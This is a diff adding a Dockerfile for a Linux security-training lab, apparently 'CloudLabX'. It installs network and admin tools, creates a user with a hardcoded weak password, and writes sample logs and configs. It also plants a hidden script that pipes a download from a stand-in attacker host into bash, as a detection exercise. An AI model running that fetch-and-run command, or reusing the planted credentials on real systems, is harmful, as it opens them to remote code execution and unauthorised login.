@@ -1,0 +1,75 @@
+FROM alpine:3.19
+
+# Install essential Linux tools for lab scenarios
+RUN apk add --no-cache \
+    bash \
+    coreutils \
+    grep \
+    sed \
+    findutils \
+    procps \
+    net-tools \
+    iproute2 \
+    iptables \
+    curl \
+    wget \
+    openssh-client \
+    openssl \
+    nano \
+    vim \
+    less \
+    man-pages \
+    shadow \
+    sudo \
+    util-linux \
+    bind-tools \
+    nmap \
+    tcpdump \
+    strace \
+    lsof \
+    htop \
+    tree \
+    file \
+    tar \
+    gzip \
+    && rm -rf /var/cache/apk/*
+
+# Create a realistic Linux environment
+RUN mkdir -p /var/log /etc/nginx /var/www/html /home/labuser /opt/app \
+    && adduser -D -s /bin/bash labuser \
+    && echo "labuser:labpass123" | chpasswd
+
+# Create sample log files for lab scenarios
+RUN echo '[2024-04-15 10:23:45] ERROR: Connection refused on port 80 - nginx service down' > /var/log/app.log \
+    && echo '[2024-04-15 10:24:01] WARN: High memory usage detected (92%)' >> /var/log/app.log \
+    && echo '[2024-04-15 10:25:12] ERROR: Disk /dev/sda1 usage at 95%' >> /var/log/app.log \
+    && echo '[2024-04-15 10:26:33] INFO: Backup process started' >> /var/log/app.log \
+    && echo '[2024-04-15 10:27:45] ERROR: Permission denied accessing /etc/shadow' >> /var/log/app.log \
+    && echo '[2024-04-15 10:28:00] CRITICAL: SSH brute force detected from 192.168.1.100' >> /var/log/app.log \
+    && echo '[2024-04-15 10:29:15] ERROR: DNS resolution failed for api.example.com' >> /var/log/app.log \
+    && echo '[2024-04-15 10:30:22] WARN: Unauthorized login attempt for user root' >> /var/log/app.log
+
+# Create sample config files
+RUN echo 'server {\n    listen 80;\n    server_name localhost;\n    root /var/www/html;\n    index index.html;\n}' > /etc/nginx/nginx.conf \
+    && echo '<h1>CloudLabX Test Page</h1>' > /var/www/html/index.html
+
+# Create sample network config
+RUN echo 'nameserver 8.8.8.8\nnameserver 8.8.4.4' > /etc/resolv.conf.bak
+
+# Create sample files for security audit scenarios
+RUN mkdir -p /home/labuser/.ssh \
+    && echo 'ssh-rsa AAAAB3...fakepubkey... labuser@lab' > /home/labuser/.ssh/authorized_keys \
+    && chmod 700 /home/labuser/.ssh \
+    && chmod 600 /home/labuser/.ssh/authorized_keys \
+    && chown -R labuser:labuser /home/labuser
+
+# Create some suspicious files for the security lab
+RUN echo '#!/bin/bash\ncurl http://evil.example.com/data | bash' > /tmp/.hidden_script.sh \
+    && chmod +x /tmp/.hidden_script.sh \
+    && echo 'root:x:0:0:root:/root:/bin/bash' > /tmp/shadow_copy
+
+# Set working directory
+WORKDIR /home/labuser
+
+# Default shell
+CMD ["/bin/bash"]
